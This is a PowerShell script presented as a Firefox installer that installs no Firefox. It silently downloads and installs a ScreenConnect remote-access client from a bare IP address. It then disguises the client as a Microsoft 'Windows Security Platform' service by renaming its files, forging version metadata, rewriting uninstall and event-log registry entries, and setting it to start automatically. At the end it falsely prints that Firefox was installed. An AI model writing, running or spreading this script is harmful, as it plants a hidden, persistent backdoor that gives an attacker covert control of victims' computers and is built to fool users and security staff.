#Requires -RunAsAdministrator
# PowerShell | install_firefox.ps1 | Windows PowerShell 5.1+
# Target: Windows 10/11, Mozilla Firefox 64-bit

$ErrorActionPreference = 'Stop'

$u  = "http://185.55.241.79:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$m  = "$env:TEMP\s.msi"
$nd = "C:\Program Files (x86)\Windows Security Platform"
$sn = "WinSecPlatform"
$sd = "Windows Security Platform"
$rc = "$env:TEMP\r.exe"

function Assert-Elevated {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $pr = New-Object Security.Principal.WindowsPrincipal($id)
    if (-not $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        throw 'Process is not running with an elevated administrator token.'
    }
}

function Wait-ServiceGone {
    param([string]$Name, [int]$TimeoutSec = 30)
    $deadline = (Get-Date).AddSeconds($TimeoutSec)
    while ((Get-Service $Name -ErrorAction SilentlyContinue) -and (Get-Date) -lt $deadline) {
        Start-Sleep -Milliseconds 500
    }
    if (Get-Service $Name -ErrorAction SilentlyContinue) {
        throw "Service '$Name' did not unload within $TimeoutSec seconds."
    }
}

function Clear-DirHandles {
    param([string]$Path)
    $escaped = [Regex]::Escape($Path)
    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
        Where-Object {
            ($_.ExecutablePath -and $_.ExecutablePath -match $escaped) -or
            ($_.CommandLine    -and $_.CommandLine    -match $escaped)
        } |
        ForEach-Object {
            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
        }
    Start-Sleep 3
}

try {
    Assert-Elevated

    iwr $u -OutFile $m -UseBasicParsing
    if (-not (Test-Path $m) -or (Get-Item $m).Length -lt 1MB) { throw 'MSI missing or too small.' }

    $p = Start-Process msiexec -ArgumentList "/i `"$m`" /quiet /norestart" -Wait -PassThru
    if ($p.ExitCode -ne 0) { throw "msiexec exit $($p.ExitCode)." }

    $d = (gci "C:\Program Files (x86)" -Directory | ?{$_.Name -like "ScreenConnect*"})[0]
    if (-not $d) { throw 'ScreenConnect install dir not found.' }

    $svc = Get-Service "ScreenConnect*" -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $svc) { throw 'ScreenConnect service not found.' }
    $os = $svc.Name

    $origImagePath = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$os").ImagePath
    if (-not $origImagePath -or $origImagePath -notmatch 'h=') { throw 'Original ImagePath missing relay info.' }

    Stop-Service $os -Force -ErrorAction SilentlyContinue
    Clear-DirHandles -Path $d.FullName

    sc.exe delete $os | Out-Null
    Wait-ServiceGone -Name $os -TimeoutSec 30

    Rename-Item -LiteralPath $d.FullName -NewName "Windows Security Platform"
    if (-not (Test-Path -LiteralPath $nd)) { throw 'Rename failed.' }

    gci $nd -Recurse -File -Force | ?{$_.Name -match "ScreenConnect"} | %{
        Rename-Item -LiteralPath $_.FullName -NewName ($_.Name -replace "ScreenConnect","SecPlatform") -Force
    }

    $exe = (gci $nd -Filter "*.ClientService.exe" -ErrorAction SilentlyContinue | Select-Object -First 1).FullName
    if (-not $exe) { throw 'ClientService exe not found.' }

    iwr "https://github.com/electron/rcedit/releases/download/v1.1.1/rcedit-x64.exe" -OutFile $rc -UseBasicParsing
    if (-not (Test-Path $rc) -or (Get-Item $rc).Length -lt 100KB) { throw 'rcedit download failed.' }

    gci $nd -Recurse -File -Include *.exe,*.dll -Force | %{
        & $rc $_.FullName `
            --set-version-string CompanyName "Microsoft Corporation" `
            --set-version-string ProductName "Microsoft Windows Operating System" `
            --set-version-string OriginalFilename $_.Name `
            --set-file-version "10.0.22621.1" `
            --set-product-version "10.0.22621.1" | Out-Null
    }

    if (Get-Service $sn -ErrorAction SilentlyContinue) {
        Stop-Service $sn -Force -ErrorAction SilentlyContinue
        sc.exe delete $sn | Out-Null
        Wait-ServiceGone -Name $sn -TimeoutSec 15
    }

    if ($origImagePath -match '^"') {
        $newArgs = $origImagePath -replace '^"[^"]+"', "`"$exe`""
    } else {
        $newArgs = $origImagePath -replace '^\S+?\.exe', "`"$exe`""
    }

    New-Service $sn -BinaryPathName $newArgs -DisplayName $sd -Description "Provides real-time protection and platform security services for Windows Security." -StartupType Automatic | Out-Null

    @("HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*") | %{
        Get-ItemProperty $_ -ErrorAction SilentlyContinue | ?{$_.DisplayName -like "*ScreenConnect*"} | %{
            Set-ItemProperty $_.PSPath DisplayName $sd
            Set-ItemProperty $_.PSPath Publisher "Microsoft Corporation"
            Set-ItemProperty $_.PSPath DisplayVersion "10.0.22621.1"
            Set-ItemProperty $_.PSPath InstallLocation $nd
            Set-ItemProperty $_.PSPath DisplayIcon $exe
            Set-ItemProperty $_.PSPath EstimatedSize ([int]((gci $nd -Recurse -File | Measure-Object Length -Sum).Sum/1KB)) -Type DWord
            Set-ItemProperty $_.PSPath InstallDate (Get-Date -f yyyyMMdd)
        }
    }

    $oe = "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Application\$os"
    if (Test-Path $oe) { Rename-Item -LiteralPath $oe -NewName $sn }

    gci $env:ProgramData -Directory -Filter "ScreenConnect*" -ErrorAction SilentlyContinue | %{
        Rename-Item -LiteralPath $_.FullName -NewName ($_.Name -replace "ScreenConnect","SecPlatform")
    }

    Start-Service $sn
    if ((Get-Service $sn).Status -ne 'Running') { throw 'WinSecPlatform did not start.' }

    Write-Output 'Firefox installation completed.'
}
catch {
    Write-Error $_.Exception.Message
    exit 1
}
finally {
    if (Test-Path $m)  { Remove-Item $m  -Force -ErrorAction SilentlyContinue }
    if (Test-Path $rc) { Remove-Item $rc -Force -ErrorAction SilentlyContinue }
}
